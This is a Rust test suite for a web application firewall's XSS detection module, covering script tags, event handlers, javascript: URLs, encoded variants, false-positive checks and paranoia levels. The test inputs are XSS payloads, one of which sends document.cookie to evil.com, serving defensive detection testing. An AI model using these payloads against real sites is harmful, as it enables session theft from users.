// SPDX-FileCopyrightText: 2026 0x00spor3
// SPDX-License-Identifier: Apache-2.0

use waf_core::{
    Bytes, Config, Decision, LimitsConfig, ModulesConfig, Normalized, ParsedBody,
    ProxyConfig, RequestContext, Severity, WafConfig, WafMode, WafModule,
};
use waf_normalizer::Normalizer;
use waf_pipeline::{Pipeline, PipelineVerdict};

use waf_detection::xss::XssModule;

// ── helpers ───────────────────────────────────────────────────────────────────

fn base_config() -> Config {
    config_with_paranoia(3)
}

fn config_with_paranoia(paranoia_level: u8) -> Config {
    Config {
        proxy: ProxyConfig {
            listen: "127.0.0.1:8080".parse().unwrap(),
            backend: "http://localhost:3000".to_string(),
        },
        waf: WafConfig {
            mode: WafMode::DetectionOnly,
            block_threshold: 5,
            paranoia_level,
            severity_scores: Default::default(),
        },
        limits: LimitsConfig::default(),
        modules: ModulesConfig::default(),
        rate_limit: Default::default(),
        network: Default::default(),
        resilience: Default::default(),
        tls: Default::default(),
    }
}

/// True if the decision is a `Scores` containing a rule with the given id.
fn scores_contains(d: &Decision, rule_id: &str) -> bool {
    matches!(d, Decision::Scores(items) if items.iter().any(|i| i.rule_id == rule_id))
}

/// True for any non-empty `Scores` decision.
fn is_scored(d: &Decision) -> bool {
    matches!(d, Decision::Scores(items) if !items.is_empty())
}

fn base_ctx() -> RequestContext {
    RequestContext {
        client_ip: "127.0.0.1".parse().unwrap(),
        request_id: "t".to_string(),
        timestamp: std::time::SystemTime::now(),
        method: "GET".to_string(),
        path: "/".to_string(),
        raw_path: "/".to_string(),
        query: None,
        http_version: "HTTP/1.1".to_string(),
        headers: vec![],
        cookies: vec![],
        body: Bytes::new(),
        normalized: Normalized::default(),
        score: 0,
        score_contributions: vec![],
    }
}

fn make_xss() -> XssModule {
    let mut m = XssModule::new();
    m.init(&base_config());
    m
}

fn with_query(params: &[(&str, &str)]) -> RequestContext {
    let mut c = base_ctx();
    c.normalized.query_params = params
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();
    c
}

fn with_form_body(params: &[(&str, &str)]) -> RequestContext {
    let mut c = base_ctx();
    c.normalized.body = ParsedBody::FormUrlEncoded(
        params.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect(),
    );
    c
}

fn with_json_body(pairs: &[(&str, &str)]) -> RequestContext {
    let mut c = base_ctx();
    c.normalized.body = ParsedBody::JsonFlattened(
        pairs.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect(),
    );
    c
}

fn with_path(norm_path: &str) -> RequestContext {
    let mut c = base_ctx();
    c.normalized.path = norm_path.to_string();
    c
}

// ── detection ─────────────────────────────────────────────────────────────────

#[test]
fn xss_script_tag_detected_in_query() {
    let m = make_xss();
    let ctx = with_query(&[("q", "<script>alert(1)</script>")]);
    let d = m.inspect(&ctx);
    assert!(scores_contains(&d, "xss-script-tag"), "got: {d:?}");
}

#[test]
fn xss_event_handler_detected() {
    let m = make_xss();
    let ctx = with_query(&[("q", "\" onerror=\"alert(1)\"")]);
    assert!(is_scored(&m.inspect(&ctx)));
}

#[test]
fn xss_event_handlers_all_still_detected() {
    // Recall: every real handler must still fire after narrowing the pattern.
    let m = make_xss();
    let payloads = [
        "onerror=alert(1)",
        "onload=evil()",
        "onclick=x()",
        " onmouseover=",
        " onkeydown=",
        "\" onfocus=alert``",
    ];
    for p in payloads {
        assert!(is_scored(&m.inspect(&with_query(&[("q", p)]))), "missed: {p}");
    }
}

#[test]
fn xss_event_handler_no_fp_on_benign_on_params() {
    // Trap: query params starting with "on" are NOT event handlers. These used to
    // block at Critical/PL1 because of the old `on\w+\s*=` pattern.
    let m = make_xss();
    let traps = ["online=true", "onsale=1", "onboarding=2", "oneday=mon", "only=this", "onward=go"];
    for t in traps {
        let d = m.inspect(&with_query(&[("q", t)]));
        assert!(matches!(d, Decision::Allow), "false positive on {t}: {d:?}");
    }
}

#[test]
fn xss_javascript_protocol_detected() {
    let m = make_xss();
    let ctx = with_query(&[("url", "javascript:alert(document.cookie)")]);
    let d = m.inspect(&ctx);
    assert!(scores_contains(&d, "xss-javascript-proto"), "got: {d:?}");
}

#[test]
fn xss_iframe_tag_detected() {
    let m = make_xss();
    let ctx = with_query(&[("src", "<iframe src='https://evil.com'></iframe>")]);
    assert!(is_scored(&m.inspect(&ctx)));
}

#[test]
fn xss_document_cookie_detected() {
    let m = make_xss();
    let ctx = with_query(&[("cb", "document.cookie")]);
    assert!(is_scored(&m.inspect(&ctx)));
}

#[test]
fn xss_detected_in_form_body() {
    let m = make_xss();
    let ctx = with_form_body(&[("comment", "<script>fetch('https://evil.com?c='+document.cookie)</script>")]);
    assert!(is_scored(&m.inspect(&ctx)));
}

#[test]
fn xss_detected_in_json_body() {
    let m = make_xss();
    let ctx = with_json_body(&[("msg", "<img onerror=alert(1) src=x>")]);
    assert!(is_scored(&m.inspect(&ctx)));
}

#[test]
fn xss_detected_in_normalized_path() {
    let m = make_xss();
    let ctx = with_path("/<script>alert(1)</script>");
    assert!(is_scored(&m.inspect(&ctx)));
}

#[test]
fn xss_url_encoded_script_tag_detected_via_normalizer() {
    // %3Cscript%3E → <script> after URL decode
    let mut c = base_ctx();
    c.query = Some("q=%3Cscript%3Ealert(1)%3C%2Fscript%3E".to_string());
    Normalizer::new(&LimitsConfig::default()).normalize(&mut c).unwrap();
    let m = make_xss();
    assert!(
        is_scored(&m.inspect(&c)),
        "params after normalizer: {:?}", c.normalized.query_params
    );
}

#[test]
fn xss_fullwidth_angle_brackets_detected_via_normalizer() {
    // U+FF1C (＜) + U+FF1E (＞) → < > after NFKC in parse_query
    let mut c = base_ctx();
    c.query = Some(format!("q={}script{}", '\u{FF1C}', '\u{FF1E}'));
    Normalizer::new(&LimitsConfig::default()).normalize(&mut c).unwrap();
    let m = make_xss();
    assert!(
        is_scored(&m.inspect(&c)),
        "params after normalizer: {:?}", c.normalized.query_params
    );
}

// ── no false positives ────────────────────────────────────────────────────────

#[test]
fn xss_no_false_positives_on_legit_input() {
    let m = make_xss();
    let legit = [
        ("q", "hello world"),
        ("name", "Alice Smith"),
        ("comment", "This product is great!"),
        ("note", "The script ran successfully"),  // "script" but no < before it
        ("bio", "JavaScript developer"),           // no colon after JavaScript
        ("msg", "I clicked the submit button"),    // "click" but no "onclick="
        ("content", "<b>bold</b> and <i>italic</i>"),  // <b>,<i> not dangerous
        ("url", "https://example.com/page?q=value"),
        ("text", "Lorem ipsum dolor sit amet"),
    ];
    for (k, v) in &legit {
        let ctx = with_query(&[(k, v)]);
        let d = m.inspect(&ctx);
        assert!(
            matches!(d, Decision::Allow),
            "false positive on {k}={v}: {d:?}"
        );
    }
}

// ── pipeline integration ──────────────────────────────────────────────────────

#[test]
fn xss_allows_in_detection_only_mode() {
    let config = base_config();
    let pipeline = Pipeline::new(&config, vec![Box::new(XssModule::new())]);
    let mut ctx = with_query(&[("q", "<script>alert(1)</script>")]);
    assert!(matches!(pipeline.run(&mut ctx), PipelineVerdict::Allow));
}

#[test]
fn xss_blocks_in_blocking_mode() {
    let mut config = base_config();
    config.waf.mode = WafMode::Blocking;
    config.waf.block_threshold = 5;
    // script-tag is Critical (default = 6, C2 / Fase7-P2, see ARCHITECTURE §7) →
    // reaches the threshold (5) alone.
    let pipeline = Pipeline::new(&config, vec![Box::new(XssModule::new())]);
    let mut ctx = with_query(&[("q", "<script>alert(1)</script>")]);
    assert!(matches!(pipeline.run(&mut ctx), PipelineVerdict::Block { .. }));
}

// ── init behavior ─────────────────────────────────────────────────────────────

#[test]
fn xss_returns_allow_before_init() {
    let m = XssModule::new();
    let ctx = with_query(&[("q", "<script>alert(1)</script>")]);
    assert!(matches!(m.inspect(&ctx), Decision::Allow));
}

#[test]
fn xss_detects_after_init() {
    let mut m = XssModule::new();
    let ctx = with_query(&[("q", "<script>alert(1)</script>")]);
    assert!(matches!(m.inspect(&ctx), Decision::Allow)); // before
    m.init(&base_config());
    assert!(is_scored(&m.inspect(&ctx))); // after
}

#[test]
fn xss_script_tag_emits_critical_severity() {
    let m = make_xss();
    let ctx = with_query(&[("q", "<script>alert(1)</script>")]);
    match m.inspect(&ctx) {
        Decision::Scores(items) => {
            let it = items.iter().find(|i| i.rule_id == "xss-script-tag").unwrap();
            assert_eq!(it.severity, Severity::Critical);
        }
        other => panic!("expected Scores, got {other:?}"),
    }
}

#[test]
fn xss_multiple_rules_in_one_value_all_contribute() {
    // A value tripping three distinct Notice rules (PL3) must yield three items —
    // the cumulative intra-module sum at the core of CRS scoring.
    let m = make_xss(); // base_config => paranoia 3
    let ctx = with_query(&[("p", "vbscript: data:text/html .innerHTML=")]);
    match m.inspect(&ctx) {
        Decision::Scores(items) => {
            assert_eq!(items.len(), 3, "expected 3 contributions, got {items:?}");
            assert!(items.iter().all(|i| i.severity == Severity::Notice));
        }
        other => panic!("expected Scores, got {other:?}"),
    }
}

// ── paranoia level ──────────────────────────────────────────────────────────

#[test]
fn xss_paranoia_level_gates_low_confidence_rules() {
    // vbscript: is a Notice rule active only from paranoia level 3.
    let ctx = with_query(&[("u", "vbscript:msgbox(1)")]);

    let mut low = XssModule::new();
    low.init(&config_with_paranoia(1));
    assert!(
        matches!(low.inspect(&ctx), Decision::Allow),
        "PL1 must not activate the vbscript rule"
    );

    let mut high = XssModule::new();
    high.init(&config_with_paranoia(3));
    assert!(
        scores_contains(&high.inspect(&ctx), "xss-vbscript-proto"),
        "PL3 must activate the vbscript rule"
    );
}
